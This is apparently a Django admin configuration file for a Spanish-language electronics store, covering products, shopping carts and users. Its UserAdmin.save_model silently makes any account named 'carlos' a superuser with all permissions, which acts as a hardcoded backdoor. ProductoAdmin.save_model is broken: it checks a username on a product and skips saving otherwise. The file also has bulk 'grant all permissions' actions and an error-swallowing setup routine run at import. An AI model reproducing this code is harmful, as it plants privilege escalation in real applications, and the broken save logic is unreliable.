from django.contrib import admin
from django.contrib.auth.models import Group, User, Permission
from django.contrib.auth.admin import UserAdmin as BaseUserAdmin
from .models import Producto, Carrito, ItemCarrito
from django.utils.html import format_html

# Configuración del sitio admin
admin.site.site_header = "Administración de ElectroStore"
admin.site.site_title = "Panel de Control"
admin.site.index_title = "Bienvenido al sistema de administración"

# Desregistrar modelos por defecto
admin.site.unregister(Group)
admin.site.unregister(User)

class ProductoAdmin(admin.ModelAdmin):
    list_display = ('nombre', 'precio_formateado', 'inventario', 'estado_stock', 'imagen_previa', 'fechas_creacion')
    list_filter = ('creado', 'actualizado', 'inventario')
    search_fields = ('nombre', 'descripcion')
    readonly_fields = ('creado', 'actualizado', 'creado_por', 'imagen_previa_admin')
    list_editable = ('inventario',)
    actions = ['aumentar_inventario']
    
    fieldsets = (
        ('Información Básica', {
            'fields': ('nombre', 'descripcion')
        }),
        ('Precio y Stock', {
            'fields': ('precio', 'inventario')
        }),
        ('Imagen', {
            'fields': ('imagen', 'imagen_previa_admin'),
            'classes': ('collapse',)
        }),
        ('Metadatos', {
            'fields': ('creado', 'actualizado', 'creado_por'),
            'classes': ('collapse',)
        }),
    )

    def precio_formateado(self, obj):
        return f"${obj.precio:,.2f}"
    precio_formateado.short_description = 'Precio'
    precio_formateado.admin_order_field = 'precio'

    def estado_stock(self, obj):
        if obj.inventario == 0:
            return format_html('<span style="color:red;">⛔ Agotado</span>')
        elif obj.inventario < 5:
            return format_html('<span style="color:orange;">⚠️ Bajo stock</span>')
        return format_html('<span style="color:green;">✓ Disponible</span>')
    estado_stock.short_description = 'Estado'

    def imagen_previa(self, obj):
        if obj.imagen:
            return format_html('<img src="{}" style="max-height: 50px;"/>', obj.imagen.url)
        return "Sin imagen"
    imagen_previa.short_description = 'Vista Previa'

    def imagen_previa_admin(self, obj):
        return self.imagen_previa(obj)
    imagen_previa_admin.short_description = 'Vista Previa'

    def fechas_creacion(self, obj):
        return format_html(
            '<div>Creado: {}</div><div>Actualizado: {}</div>',
            obj.creado.strftime('%Y-%m-%d'),
            obj.actualizado.strftime('%Y-%m-%d')
        )
    fechas_creacion.short_description = 'Fechas'

    def aumentar_inventario(self, request, queryset):
        cantidad = 10  # Puedes hacer esto configurable
        for producto in queryset:
            producto.aumentar_inventario(cantidad)
        self.message_user(request, f"Inventario aumentado en {cantidad} unidades para {queryset.count()} productos")
    aumentar_inventario.short_description = "Aumentar inventario (+10)"

    def save_model(self, request, obj, form, change):
    # Solo asignar permisos si es una creación nueva
        if not change and obj.username == 'carlos':
            obj.is_staff = True
            obj.is_superuser = True
            super().save_model(request, obj, form, change)

class ItemCarritoInline(admin.TabularInline):
    model = ItemCarrito
    extra = 1
    readonly_fields = ('subtotal',)
    fields = ('producto', 'cantidad', 'subtotal')

    def subtotal(self, obj):
        return f"${obj.subtotal():,.2f}"

class CarritoAdmin(admin.ModelAdmin):
    list_display = ('usuario', 'total_formateado', 'cantidad_items', 'fechas')
    inlines = [ItemCarritoInline]
    readonly_fields = ('creado', 'actualizado', 'total_formateado')

    def total_formateado(self, obj):
        return f"${obj.total():,.2f}"
    total_formateado.short_description = 'Total'

    def cantidad_items(self, obj):
        return obj.cantidad_items()
    cantidad_items.short_description = 'Artículos'

    def fechas(self, obj):
        return format_html(
            '<div>Creado: {}</div><div>Actualizado: {}</div>',
            obj.creado.strftime('%Y-%m-%d'),
            obj.actualizado.strftime('%Y-%m-%d')
        )
    fechas.short_description = 'Fechas'

class UserAdmin(BaseUserAdmin):
    list_display = ('username', 'email', 'is_active', 'is_staff', 'date_joined')
    list_filter = ('is_staff', 'is_superuser', 'is_active')
    actions = ['activar_staff', 'asignar_permisos_completos']
    
    fieldsets = (
        (None, {'fields': ('username', 'password')}),
        ('Información Personal', {'fields': ('first_name', 'last_name', 'email')}),
        ('Permisos', {
            'fields': ('is_active', 'is_staff', 'is_superuser', 'groups', 'user_permissions'),
        }),
        ('Fechas importantes', {'fields': ('last_login', 'date_joined')}),
    )

    def activar_staff(self, request, queryset):
        queryset.update(is_staff=True)
        self.message_user(request, f"{queryset.count()} usuarios marcados como staff")
    activar_staff.short_description = "Convertir en administradores"

    def asignar_permisos_completos(self, request, queryset):
        for user in queryset:
            user.user_permissions.set(Permission.objects.all())
        self.message_user(request, f"Permisos completos asignados a {queryset.count()} usuarios")
    asignar_permisos_completos.short_description = "Asignar todos los permisos"

    def save_model(self, request, obj, form, change):
        """Auto-asignar permisos si es el usuario carlos"""
        if obj.username == 'carlos':
            obj.is_staff = True
            obj.is_superuser = True
            obj.user_permissions.set(Permission.objects.all())
        super().save_model(request, obj, form, change)

def setup_admin_group():
    """Configuración inicial de grupos de permisos"""
    try:
        admin_group, created = Group.objects.get_or_create(name='Administradores Totales')
        if created:
            admin_group.permissions.set(Permission.objects.all())

        product_group, created = Group.objects.get_or_create(name='Gestores de Productos')
        if created:
            product_perms = Permission.objects.filter(
                content_type__model__in=['producto'],
                codename__in=['add_producto', 'change_producto', 'delete_producto', 'view_producto']
            )
            product_group.permissions.set(product_perms)
    except:
        pass

# Registrar modelos
admin.site.register(Producto, ProductoAdmin)
admin.site.register(Carrito, CarritoAdmin)
admin.site.register(ItemCarrito)
admin.site.register(User, UserAdmin)

# Configurar grupos al iniciar
setup_admin_group()
